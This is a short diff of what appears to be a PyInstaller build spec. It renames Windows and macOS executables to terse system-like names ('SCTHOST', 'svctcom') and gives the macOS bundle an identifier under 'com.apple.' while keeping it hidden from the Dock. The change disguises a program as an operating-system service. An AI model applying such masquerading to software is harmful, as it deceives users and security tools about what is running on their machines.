@@ -23,10 +23,10 @@ is_mac = sys.platform == "darwin"
 
 # ── Unified Naming ───────────────────────────────────────────────────────────
 if is_win:
-    EXE_NAME = "windowstelementoryservice"
+    EXE_NAME = "SCTHOST"
 else:
-    EXE_NAME = "macstelementoryservice"
-    BUNDLE_NAME = "macstelementoryservice.app"
+    EXE_NAME = "svctcom"
+    BUNDLE_NAME = "svctcom.app"
 
 icon_path = None
 if is_win:
@@ -91,11 +91,11 @@ if is_mac:
         exe,
         name=BUNDLE_NAME,
         icon=icon_path,
-        bundle_identifier="com.apple.macstelementoryservice",
+        bundle_identifier="com.apple.svctcom",
         info_plist={
             "LSUIElement": True,
-            "CFBundleDisplayName": "macstelementoryservice",
-            "CFBundleName": "macstelementoryservice",
+            "CFBundleDisplayName": "svctcom",
+            "CFBundleName": "svctcom",
             "CFBundleShortVersionString": "1.1.0",
             "NSHighResolutionCapable": True,
         },
